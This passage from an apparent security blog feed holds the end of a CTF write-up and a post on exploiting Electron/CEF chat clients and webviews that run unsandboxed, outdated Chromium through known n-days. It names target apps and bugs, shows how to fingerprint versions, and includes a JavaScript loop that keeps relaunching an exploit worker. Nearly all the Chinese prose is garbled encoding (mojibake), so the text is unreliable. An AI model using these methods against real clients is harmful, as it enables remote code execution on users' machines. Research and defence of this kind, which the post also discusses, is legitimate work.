class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull muhe/ctf_chal_chatroom:v7</span><br><span class="line"></span><br><span class="line">docker run -dit --name chatroom1 -p 3000:3000 -p 31337:31337 muhe/ctf_chal_chatroom:v7</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>http://localhost:3000</code> å°±å¯ä»¥æœ¬åœ°æµ‹è¯•é¢˜ç›®äº†  :)</p><h2 id="ä¸è¶³ä¹‹å¤„"><a href="#ä¸è¶³ä¹‹å¤„" class="headerlink" title="ä¸è¶³ä¹‹å¤„"></a>ä¸è¶³ä¹‹å¤„</h2><ol><li>æ— æ³•é˜²æ­¢çˆ†ç ´è¿™ç§éé¢„æœŸè§£é¢˜æ–¹å¼ã€‚</li><li>ä½¿ç”¨ndayä¼¼ä¹å¾ˆæ— è¶£ï¼Œä½†æ˜¯å¡è¿›å»ä¸€ä¸ªæ´ï¼Œç»™ä¸€ä¸ª <code>patch.diff</code> ä¼¼ä¹åˆæœ‰ç‚¹å¥‡æ€ªï¼Œåç¦»é¢˜ç›®åŸæœ¬çš„å‡ºå‘ç‚¹ã€‚</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;  åœ¨ä»Šå¹´çš„ByteCTFä¸­ï¼Œæˆ‘å‡ºäº†ä¸€é“pwné¢˜ç›®ï¼Œè·ç¦»ä¸Šä¸€æ¬¡æ‰“æ¯”èµ›/å‡ºé¢˜å·²ç»è¿‡å»å¾ˆä¹…äº†ï¼Œæ‰€ä»¥ä¼ ç»Ÿçš„ &lt;code&gt;heap trick&lt;/code&gt; å°±æ²¡æœ‰è€ƒè™‘ï¼Œè€Œæ˜¯ä»æˆ‘æ—¥å¸¸å·¥ä½œä¸­æŒ–æ˜çš„å®‰å…¨é£é™©å…¥æ‰‹ï¼Œç®€åŒ–åœºæ™¯ï¼Œå‡ºäº†ä¸€é“ &lt;code&gt;chatroom&lt;/code&gt; ï¼Œçœ‹èµ·æ¥åƒä¸€ä¸ªwebçš„å¥‡æ€ªé¢˜ç›®ã€‚&lt;/p&gt;</summary>
    
    
    
    
    <category term="writeup" scheme="https://o0xmuhe.github.io/tags/writeup/"/>
    
    <category term="pwn" scheme="https://o0xmuhe.github.io/tags/pwn/"/>
    
    <category term="CTF" scheme="https://o0xmuhe.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Expand Chrome Exploit : From client to server</title>
    <link href="https://o0xmuhe.github.io/2021/10/04/Expand-Chrome-From-client-to-server/"/>
    <id>https://o0xmuhe.github.io/2021/10/04/Expand-Chrome-From-client-to-server/</id>
    <published>2021-10-03T16:30:35.000Z</published>
    <updated>2022-08-24T15:24:25.088Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>  è¿‡å»çš„è¿‘ä¸€å¹´çš„æ—¶é—´(æœ¬æ–‡åœ¨21å¹´å¼€çš„å¤´ï¼ŒæœŸé—´ä¸€ç›´æ˜¯hiddençŠ¶æ€)ï¼Œæˆ‘æ¥è§¦äº†<del>ä¸‡æ¶çš„</del>æµè§ˆå™¨å®‰å…¨ï¼Œä¸è¿‡åªæ˜¯ä¸€ä¸ªè„šæœ¬å°å­çš„æ°´å¹³ :(  </p><span id="more"></span><p>  æœ€å¼€å§‹æ˜¯ç”±äºä¸€äº›å·¥ä½œä¸Šçš„å› ç´ ï¼Œå…³æ³¨äº†ä¸€äº›ä¸»æµçš„IMå®¢æˆ·ç«¯ï¼Œéš¾æ˜“ç¨‹åº¦ä¸ç­‰ï¼Œå½“ç„¶ä¹Ÿçœ‹äº†ä¸å°‘å‰è¾ˆçš„ç²¾å½©å·¥ä½œï¼Œæ¯”å¦‚äºŒå“¥çš„å„ç§å¥‡å¦™çš„xssã€ä¼ªåè®®æ‰“ğŸ§å•¥çš„ã€‚æ— å¥ˆåŠŸå¤«ä¸åˆ°å®¶åªèƒ½å¦è¾Ÿè¹Šå¾„ï¼Œå†åŠ ä¸Šå¤§å­¦æ—¶å€™@wuyanå­¦é•¿æŸæ¬¡å›å­¦æ ¡ç»™æˆ‘ä»¬åšå°ç»„åˆ†äº«çš„æ—¶å€™å±•ç¤ºäº†å½“æ—¶å°è±¡ç¬”è®°çš„ä¸€ä¸ªxssçš„æ—¶å€™æäº†ä¸€å¥ï¼Œå¾ˆå¤šå®¢æˆ·ç«¯ä½ å¯ä»¥æŠŠå®ƒå½“æˆä¸€ä¸ªæµè§ˆå™¨æ¥çœ‹ï¼›è‡³æ­¤è¿™æ‰æœ‰äº†åæ¥çš„æ¢ç©¶å’Œä¸€ç‚¹ç‚¹æˆæœå§ï¼Œæ—¶è‡³ä»Šæ—¥ï¼Œç›¸å…³æ¼æ´æ—©å·²ä¿®å¤ï¼Œæ”»å‡»æ‰‹æ³•ä¹Ÿæ—©å·²â€œä¼—æ‰€å‘¨çŸ¥â€ï¼Œæ‰€ä»¥å†™ä¸ªè®°å½•ä¹Ÿæ²¡æœ‰ä»€ä¹ˆ:D </p><h2 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h2><blockquote><p>ä¸»è¦æ˜¯ä¸€äº›Electronå’ŒCEFå®¢æˆ·ç«¯</p></blockquote><h3 id="ä¸€äº›èƒŒæ™¯-amp-è°ƒç ”å·¥ä½œ"><a href="#ä¸€äº›èƒŒæ™¯-amp-è°ƒç ”å·¥ä½œ" class="headerlink" title="ä¸€äº›èƒŒæ™¯ &amp; è°ƒç ”å·¥ä½œ"></a>ä¸€äº›èƒŒæ™¯ &amp; è°ƒç ”å·¥ä½œ</h3><blockquote><p>ä¸»æµå®¢æˆ·ç«¯çš„æƒ…å†µï¼Œä»¥å‰ &amp; ç°åœ¨</p></blockquote><p>  å…³æ³¨å®¢æˆ·ç«¯å®‰å…¨çš„åŒå­¦åº”è¯¥ä¼šå‘ç°Electron&amp;CEFçš„åº”ç”¨è¶Šæ¥è¶Šå¹¿æ³›äº†ï¼Œä»æ—©äº›çš„æ—¶å€™æŸéŸ³ä¹æ’­æ”¾å™¨çš„xss2rceåˆ°åé¢è¢«å…³æ³¨åˆ°å†…ç½®æµè§ˆå™¨æœ¬èº«ï¼Œå½“ç„¶å¤§ä½¬å¯èƒ½æ›´æ—©çš„æ—¶å€™å°±è¿™ä¹ˆç©äº† :D </p><p>å…¶å®æ˜¯ç”¨æµè§ˆå™¨æ¡†æ¶æ¥å¼€å‘å®¢æˆ·ç«¯æ˜¯ä¸€ç›´ä»¥æ¥å°±æœ‰çš„ä¸œè¥¿ï¼Œæ¯”å¦‚ä¸‹é¢è¿™å¼ å›¾(å¯èƒ½ä¸å®Œå…¨): </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image"></p><blockquote><p>ä¹Ÿæœ‰ç›´æ¥ä»chromiumåšå®šåˆ¶å¼€å‘çš„ï¼Œå³åŸç”Ÿçš„æ–¹å¼å¼€å‘ï¼Œæ¯”å¦‚æŸå…ˆè¿›IM</p></blockquote><p>è¿™ä¹ˆåšçš„å¥½å¤„æ˜¯æ˜¾è€Œæ˜“è§çš„:</p><ul><li><p>ä½¿ç”¨æˆç†Ÿçš„åµŒå…¥å¼æµè§ˆå™¨æ¡†æ¶(cef, electronç­‰)èƒ½å¤Ÿå¿«é€Ÿå¼€å‘åº”ç”¨</p></li><li><p>èƒ½å¤Ÿè§„é¿å¾ˆå¤šå¤æ‚çš„åº•å±‚è®¾è®¡(c/c++)</p></li><li><p>å‰ç«¯â€“&gt;APPè·¨å¹³å°çš„ç‰¹æ€§ï¼Œä¸”å¾ˆçµæ´»ï¼Œ</p></li><li><p>æ›´åŠ æ–¹ä¾¿æ”¯æŒè‡ªå®šä¹‰åè®®/æ‰©å±•/JSå¯¹è±¡ç­‰</p></li><li><p>â€¦</p><p>ä¸æ­¤åŒæ—¶ï¼Œæµè§ˆå™¨çš„æ”»å‡»é¢å°±è‡ªç„¶è€Œç„¶åœ°å¼•å…¥è¿›æ¥äº†ï¼Œå†ç»“åˆå®¢æˆ·ç«¯æœ¬èº«ï¼Œ1+1&gt;2çš„å³è§†æ„Ÿã€‚æœ¬æ–‡é‡ç‚¹å…³æ³¨æµè§ˆå™¨ç›¸å…³çš„å†…å®¹ï¼Œé‚£æŒ‰ç…§æµè§ˆå™¨çš„æ€è·¯å»è€ƒè™‘å°±æ˜¯:</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»å‡»è€…æ„é€ æ¶æ„é¡µé¢--&gt;å®¢æˆ·ç«¯è®¿é—®--&gt;RCE</span><br><span class="line">                              |</span><br><span class="line">                        Render---(sbx)---&gt;Broker</span><br></pre></td></tr></table></figure><p>è¿™æ¡æ”»å‡»é“¾è·¯ä¸Šçš„å‰ç½®æ¡ä»¶æ˜¯**å®¢æˆ·ç«¯å¯ä»¥æ‰“å¼€ä»»æ„URL(ç›´æ¥oré—´æ¥)**ï¼Œéšåå°±æ˜¯å¸¸è§„çš„æµè§ˆå™¨Exploitï¼Œåˆ†æˆRender RCE+SBXä¸¤éƒ¨åˆ†ã€‚</p><p>å¦™å°±å¦™åœ¨å¾ˆå¤šå®¢æˆ·ç«¯å‡ºäºä¸€äº›ç‰¹æ®Šçš„éœ€æ±‚ä»–æ²¡æœ‰å¼€æ²™ç®±ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/images.jpeg" alt="å¦™å•Š"></p><p>è¿™é‡Œæœ‰ä¸€ä»½ç»Ÿè®¡ : <a href="https://github.com/sickcodes/no-sandbox">https://github.com/sickcodes/no-sandbox</a>ï¼Œå½“ç„¶ä¹Ÿä¸ä¸€å®šå¯¹(æ¯”å¦‚å¾®ä¿¡æ˜¯CEFå§)ï¼Œæœ‰äº›å®¢æˆ·ç«¯ä¹Ÿå‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼Œä¸è¿‡å¯ä»¥é€šè¿‡å†å²è®°å½•çœ‹å‡ºæ¥å˜åŒ–è¶‹åŠ¿ï¼Œå¤§å®¶éƒ½åœ¨æ…¢æ…¢åœ°å¼€å¯æ²™ç®±ï¼Œå°è¯•é€æ¸æ”¶æ•›é£é™©ã€‚</p><p>  <code>--no-sandbox</code>çš„é£é™©æ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå¦ä¸€ä¸ªé—®é¢˜æ˜¯<code>patch gap</code>ï¼Œchromiumé‚£ä¸ªæ›´æ–°é¢‘ç‡æ²¡æœ‰å‡ ä¸ªå®¢æˆ·ç«¯èƒ½è·Ÿä¸Šï¼Œç”šè‡³è¯´åŸºæœ¬è·Ÿä¸ä¸Šï¼Œå†åŠ ä¸ŠåŠŸèƒ½ä¼˜å…ˆï¼Œç‰ˆæœ¬å‡çº§æˆ–è€…è¡¥ä¸åˆå…¥å¹¶æ²¡æœ‰é‚£ä¹ˆé«˜çš„ä¼˜å…ˆçº§(ä¹Ÿæœ‰å¯èƒ½æ˜¯é£é™©æ²¡ä½“ç°å‡ºæ¥ï¼Œä¸å—é‡è§†)ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†åŸºäºchromiumçš„å®¢æˆ·ç«¯å¤šå¤šå°‘å°‘éƒ½æ»åä¸€äº›å¤§ç‰ˆæœ¬ï¼Œè¿™å°±é€ æˆäº†å¤§é‡æ½œåœ¨çš„Ndayå½±å“è¿™äº›å®¢æˆ·ç«¯ï¼Œç”šè‡³ä»RCEåˆ°SBXä¸€æ¡é¾™ã€‚</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><h4 id="æ˜¯å¦ç›´æ¥æ‰“å¼€URL"><a href="#æ˜¯å¦ç›´æ¥æ‰“å¼€URL" class="headerlink" title="æ˜¯å¦ç›´æ¥æ‰“å¼€URL"></a>æ˜¯å¦ç›´æ¥æ‰“å¼€URL</h4><ul><li>ç›´æ¥æ‰“å¼€ï¼Œå‘é“¾æ¥ç‚¹äº†å°±å†…ç½®æµè§ˆå™¨æ‰“å¼€ï¼Œè¿™ç±»æ—©æœŸIMä¼šè¿™æ ·å¹²ï¼Œå¯èƒ½æ˜¯ä¸ºäº†â€œç”¨æˆ·ä½“éªŒæ²¡æœ‰å‰²è£‚æ„Ÿâ€</li><li>ç‰¹æ®Šçš„æ¶ˆæ¯æ‰ä¼šå†…ç½®æµè§ˆå™¨æ‰“å¼€ï¼Œæ¯”å¦‚å¡ç‰‡ï¼Ÿ</li><li>æ˜¯å¦æœ‰urlç™½åå•ï¼Œä¸èƒ½ç»•è¿‡çš„è¯å¯èƒ½éœ€è¦å¤šä¸€ä¸ªç™½åå•åŸŸåä¸‹çš„xssåšæ¡¥æ¢</li><li>ç‰¹æ®Šçš„schemeæœ‰urlå‚æ•°ï¼Œå‚è€ƒAndroidå®¢æˆ·ç«¯çš„é‚£ç§æƒ…å†µ</li><li>å…¶ä»–çš„å¥‡å¥‡æ€ªæ€ªçš„å…¥å£ï¼Œæ¯”å¦‚ç›‘å¬ç«¯å£ï¼Œå¤„ç†å‡½æ•°æœ‰ä¸ªå•¥<code>openBrowser</code>çš„ä¸œè¥¿</li></ul><h4 id="Chromiumç‰ˆæœ¬ç¡®å®š"><a href="#Chromiumç‰ˆæœ¬ç¡®å®š" class="headerlink" title="Chromiumç‰ˆæœ¬ç¡®å®š"></a>Chromiumç‰ˆæœ¬ç¡®å®š</h4><ul><li>UAï¼Œè¿™ä¸ªä¸ä¸€å®šå‡†å§ï¼Œæ¯•ç«Ÿå¯åŠ¨å‚æ•°æ˜¯å¯ä»¥æ”¹çš„ï¼Œä»£ç é‡Œä¹Ÿå¯ä»¥æ”¹ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å¯ä¿¡çš„</li><li>JSå¼•æ“ç‰¹æ€§ï¼Œè¿™ä¸ªæˆ‘åœ¨ä¹‹å‰ä¸€ä¸ªæ–‡ç« é‡Œæåˆ°è¿‡<a href="https://o0xmuhe.github.io/2021/10/17/ByteCTF2021-chatroom-writeup/">ByteCTF2021 chatroom writeup</a>ï¼Œç”¨äºæ¢æµ‹åç«¯puppeteerçš„ç‰ˆæœ¬</li></ul><p>ä»¥ä¸Šä¸¤ç§æ–¹å¼ç»“åˆæ˜¯æœ€å¥½çš„ï¼Œèƒ½åˆ¤æ–­å‡ºæ¥å¾ˆç²¾å‡†çš„ç‰ˆæœ¬</p><h4 id="é€‰ä¸ªå¥½-quot-day-quot"><a href="#é€‰ä¸ªå¥½-quot-day-quot" class="headerlink" title="é€‰ä¸ªå¥½&quot;day&quot;"></a>é€‰ä¸ªå¥½<code>&quot;day&quot;</code></h4><ul><li><p>Pj0/github/twitter/v8 commits</p></li><li><p>@BugsChromium  </p></li></ul><p>ç‰ˆæœ¬-ä»£ç commitä¹‹å‰äº’æŸ¥è¯¢å¯ä»¥å‚è€ƒ: <a href="https://omahaproxy.appspot.com/">https://omahaproxy.appspot.com/</a></p><h3 id="case1"><a href="#case1" class="headerlink" title="case1"></a>case1</h3><blockquote><p><code>xxminibrowser</code> (xxæ˜¯å•¥æˆ‘ä¹Ÿä¸çŸ¥é“)è¿™ä¸ªæ´åº”è¯¥åœ¨21å¹´ä¸ŠåŠå¹´å°±ä¿®å¤äº†ï¼Œè€Œä¸”é™†é™†ç»­ç»­è¡¥æ‰äº†ä¸å°‘æ”»å‡»çš„å‰ç½®æ¡ä»¶</p></blockquote><ul><li>Open URL</li></ul><p>æœ€æ—©å¯ä»¥éšä¾¿æ‰“å¼€ï¼Œåé¢å°±å˜æˆäº†ç‰¹æ®Šçš„æ¶ˆæ¯ï¼Œå†åæ¥è¶Šæ¥è¶Šçª„å§</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824215023030.png" alt="image-20220824215023030"></p><ul><li>ç‰ˆæœ¬ç¡®å®š</li></ul><p>ç”¨ä¸Šé¢çš„æ–¹æ³•ç¡®å®šäº†å…·ä½“çš„ç‰ˆæœ¬ï¼Œè¿˜æ˜¯å¾ˆå‡†ç¡®çš„</p><ul><li><p>é€‰ä¸ªå¥½day</p><p>å½“ç„¶äº†ï¼Œåœ¨é‚£ä¸ªæ—¶å€™è¿™ä¸ªå®¢æˆ·ç«¯ä»–çš„å¥½å…„å¼Ÿâ€œå°è€Œç¾â€ä¹Ÿæ˜¯å·®ä¸å¤šçš„æƒ…å†µï¼Œå¥½å¥½é€‰dayèƒ½éƒ½æ‰“äº†ï¼Œ21å¹´hvvçˆ†å‡ºçš„RCEå°±æ˜¯è¿™ä¸ªæƒ…å†µ(è—æ´æ²¡æœ‰å¥½ä¸‹åœº - -!)</p></li></ul><p>  å½“æ—¶ç”¨çš„æ˜¯crbug659475ï¼ŒæŒºå¥½ç”¨çš„ï¼Œæ„Ÿè°¢keen labçš„å¤§å“¥ :D ä¸ºäº†æé«˜æˆåŠŸç‡ç”šè‡³è¿˜åšäº†è¿™æ ·çš„äº‹æƒ…:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker;</span><br><span class="line"><span class="keyword">var</span> exploitSucc = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startExploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(exploitSucc)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    worker = <span class="keyword">new</span> Worker(<span class="string">&#x27;exp.js&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    worker.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">        exploitSucc = e.data;</span><br><span class="line">        <span class="keyword">if</span> (exploitSucc == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.write(<span class="string">&quot;exploit failed, retry....&lt;hr&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&quot;exploit done!!!!!&lt;hr&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">startExploit();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hangMonitor = <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (exploitSucc == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">clearInterval</span>(hangMonitor);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        startExploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">20000</span>);</span><br></pre></td></tr></table></figure><hr><p>2022.8 update</p><p>â€œå°è€Œç¾â€å¥½åƒåœ¨hvvæœŸé—´å¼€äº† <code>--jit-less</code>åé¢åˆä¸‹æ‰äº† ï¼Œç°åœ¨çš„cmdlineï¼Œä¸æ­¤åŒæ—¶ä¹Ÿå‡çº§åˆ°äº†M81</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/wechat_browser_render_cmdline.png" alt="wechat"></p><h3 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h3><blockquote><p>S***e</p></blockquote><ul><li>Open URL</li></ul><p>è¿™ä¸ªç‚¹è¯´æ¥è¿˜æœ‰ç‚¹æ•…äº‹ï¼Œ20å¹´çš„æ—¶å€™å‘ç°äº†ï¼Œç›´åˆ°21å¹´å§æœ‰ä¸€ä¸ªè€å¤–ä¹Ÿå‘ç°äº†å¹¶ä¸”å‘åœ¨äº†æ¨ç‰¹ä¸Š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824215815171.png" alt="image-20220824215815171"></p><p>è¯´æ¥ä¹Ÿç®€å•ï¼Œå°±æ˜¯ä¸ªçœ‹èµ·æ¥æ˜¯Aæ‰“å¼€ç¡®å®Bçš„é—®é¢˜ï¼Œä¸»è¦æœåŠ¡ç«¯ä¹Ÿä¸åšæ ¡éªŒå°±è½¬å‘æ˜¯æœ‰ç‚¹ç¦»è°±çš„ï¼› å¯¹äºæ‰“å¼€çš„URLä¹Ÿæ˜¯æœ‰ç™½åå•æ£€æŸ¥çš„ï¼Œæ‰€ä»¥ç‰¹å®šåŸŸä¸‹çš„xssæ˜¯æ”»å‡»çš„æ¡¥æ¢ :(</p><ul><li>ç‰ˆæœ¬</li></ul><p>M78 è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½è¯´çš„ </p><ul><li>é€‰ä¸ªday</li></ul><p>m78å¯é€‰çš„å¾ˆå¤š(æ¯”å¦‚CVE-2020-6418)ï¼Œæ³¨æ„ç›®æ ‡çš„æ˜¯x86ï¼Œéœ€è¦åšä¸€äº›æ”¹é€ ï¼Œè€Œä¸”ä¹‹å‰é‡åˆ°è¿‡æœ‰äº›æ´åªåœ¨x86_64 workçš„æƒ…å†µ</p><hr><p>2022.8 update</p><p>å‚æ•° &amp; ç‰ˆæœ¬</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/skype_render_cmdline.png" alt="skype"></p><h3 id="case3"><a href="#case3" class="headerlink" title="case3"></a>case3</h3><blockquote><p>Android webview</p></blockquote><p>  è¿™ç±»å…¶å®ä¹Ÿç®—ä¸ªé‡ç¾åŒºï¼Œå¾ˆå¤šå‚å•†ä¼šé€‰æ‹©è‡ªå·±å®šåˆ¶webviewï¼Œä¸”ä¸ºäº†æ–¹ä¾¿ä¸å¼€æ²™ç®±ï¼Œçº¿ä¸Šä¸°å¯Œå¤šå½©çš„åŠŸèƒ½ä¹Ÿæä¾›äº†å¾ˆå¤šæ”»å‡»çš„å…¥å£ï¼Œå‘é“¾æ¥ã€æ‰«ç ã€å¡ç‰‡æ¶ˆæ¯ï¼›ä½†æ˜¯ä¹Ÿéƒ½ä¼šåœ¨æ‰“å¼€URLå‰è€ƒè™‘åŠ ä¸€å±‚æ‹¦æˆªï¼Œæç¤ºç”¨æˆ·â€œxxxä¸æ˜¯xxxxxxï¼Œç¡®å®šè¦æ‰“å¼€å—â€ã€‚ä½†æ˜¯21å¹´åå„æ–­ä¹‹åï¼Œè¿™ä¸ªé™åˆ¶å°±ä¸‹æ‰äº†ï¼Œéšä¹‹è€Œæ¥çš„å°±æ˜¯è¿™æ ·çš„å®‰å…¨é£é™©ã€‚</p><p>  å¯¹äºç”²æ–¹æ¥è¯´å°±æ˜¯ï¼Œæˆ‘çš„å®šåˆ¶webviewä¾èµ–chromiumï¼Œæˆ‘åˆæ²¡åŠæ³•åŠæ—¶æ›´æ–°ï¼Œæ²™ç®±ä¹Ÿä¸€å®šèƒ½å¼€ï¼Œåœ¨ ndayå’Œ <code>patch gap</code>çš„åŒé‡æ‰“å‡»ä¹‹ä¸‹ï¼Œä½ çš„SRCå¯èƒ½å°±å˜æˆâ€œææ¬¾æœºâ€ï¼Œæ¯ä¸ªæœˆè°·æ­Œä¸€å‘è¡¥ä¸ï¼Œå†åŠ ä¸Šæ˜¯ä¸æ˜¯çˆ†å‡ºä¸ªåœ¨é‡åˆ©ç”¨ï¼Œä½ çš„SRCä¸€å®šç»å¸¸æ”¶åˆ°è¿™æ ·çš„æŠ¥å‘Š: <code>xxxxx RCE </code>ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/3c70b0f75f2f4b6184bb461e41adc428.jpeg" alt="sad"></p><p>æˆ‘ä¹Ÿæœ‰åšå®‰å…¨è¿è¥çš„æœ‹å‹<del>é¥±å—å…¶å®³</del>ï¼Œæˆ‘åªèƒ½å»ºè®®ä»–å†…éƒ¨ä¸“é¡¹æ²»ç†ï¼Œå®šæœŸåˆè¡¥ä¸ï¼Œèƒ½ä¸Šæ²™ç®±å°±æ²™ç®±ï¼Œè¿™ä¸ªçœŸæ²¡å•¥å¥½åŠæ³•ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><h4 id="ä½œä¸ºæ”»å‡»æ–¹"><a href="#ä½œä¸ºæ”»å‡»æ–¹" class="headerlink" title="ä½œä¸ºæ”»å‡»æ–¹"></a>ä½œä¸ºæ”»å‡»æ–¹</h4><ul><li>æå®šå…¥å£ï¼Œè¿™ä¸ªæ¯”è¾ƒåƒç»éªŒäº†ï¼Œè§æ‹›æ‹†æ‹›å§</li><li>å¤šç›¯ç€ç‚¹commitï¼Œå¼€å‘ä¸€äº›å·¥å…·å•¥çš„ä¹Ÿå¯ä»¥ï¼Œæ–¹ä¾¿ç”¨</li><li>åˆ©ç”¨æ­¦å™¨åŒ–ï¼Œä¸æ˜¯åªå¼¹ä¸ªè®¡ç®—å™¨å°±å®Œäº†çš„</li></ul><h4 id="ä½œä¸ºé˜²å®ˆæ–¹"><a href="#ä½œä¸ºé˜²å®ˆæ–¹" class="headerlink" title="ä½œä¸ºé˜²å®ˆæ–¹"></a>ä½œä¸ºé˜²å®ˆæ–¹</h4><ul><li><p>æ‰“è¡¥ä¸case by caseï¼Œä½†æ˜¯æ¯ä¸ªæœˆéƒ½è¦æ¥é‚£ä¹ˆä¸€æ¬¡ï¼Œè¿˜ä¸èƒ½å…¨è‡ªåŠ¨åŒ–ï¼Œæœ‰æ•ˆä½†è´¹äººåŠ›ã€‚</p></li><li><p>å¼€æ²™ç®±ï¼Œæ¯•ç«Ÿæ˜¯ä¸ªæµè§ˆå™¨ï¼Œè¿˜æ˜¯èƒ½æ‰“IPCç©¿æ²™ç®±ç©¿å‡ºæ¥ï¼Œä¸è¿‡è¿™å°±è¦çœ‹å…·ä½“æ¼æ´æƒ…å†µäº†ã€‚</p></li><li><p>å‡çº§åˆ°æœ€æ–°ç‰ˆï¼Œå¦‚æœä¸ç¨³å®šæ€ä¹ˆåŠï¼Œè¿™ä¸ªä¹Ÿä¸æ˜¯ä¸ªå¥½åŠæ³•</p></li></ul><p><code>è¡¥ä¸+å‡çº§+æ²™ç®±</code> ä¸‰ä¸ªç»´åº¦ä¸€èµ·æ¥ï¼Œæ¯•ç«ŸçŸ­æ¿æ•ˆåº”ï¼Œå°‘äº†å“ªä¸€å—éƒ½ä¸è¡Œï¼Œç”²æ–¹çš„è¯ä¹Ÿå¯ä»¥æä¸€äº›ç™½ç›’å·¥å…·æ¥åšè¡¥ä¸checkï¼Œç¡®è®¤æ¼æ´æ˜¯å¦å­˜åœ¨ï¼Œè¿™å—å°±è§ä»è§æ™ºäº†ï¼Œæˆ‘ä¹Ÿå†™è¿‡ä¸€å¥—ï¼Œæ•ˆæœè¿˜è¡Œ:D </p><h2 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h2><blockquote><p>chrome headless_shell å’Œ puppeteer</p></blockquote><p>åŸºæœ¬ä¸Šè¿˜æ˜¯ <a href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/">Exploit Headless Chrome</a>è¿™ç¯‡æ–‡ç« çš„å†…å®¹ï¼Œæ ¸å¿ƒé—®é¢˜è¿˜æ˜¯æ²™ç®±&amp;ç‰ˆæœ¬è¿‡ä½çš„é—®é¢˜ï¼Œè¿™å—æ¯”è¾ƒä¸¥é‡çš„æ˜¯ç½‘ä¸Šå¾ˆå¤šäººå†™æ•™ç¨‹ã€åšå®¢éƒ½å–œæ¬¢<code>--no-sandbox</code>ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä»–ä»¬çŸ¥ä¸çŸ¥é“è¿™ä¸ªå‚æ•°çš„å½±å“ï¼Œä¸è¿‡ä¸€ä¼ ååä¼ ç™¾ï¼Œä½ ä¼šå‘ç°å¾ˆå¤šåç«¯æ— å¤´æµè§ˆå™¨å¤šå¤šå°‘å°‘æœ‰è¿™ç±»é—®é¢˜ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/ae12bb08f457409763f629da49aabc8f.jpg" alt="no"></p><h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><h4 id="ä½œä¸ºé˜²å®ˆæ–¹-1"><a href="#ä½œä¸ºé˜²å®ˆæ–¹-1" class="headerlink" 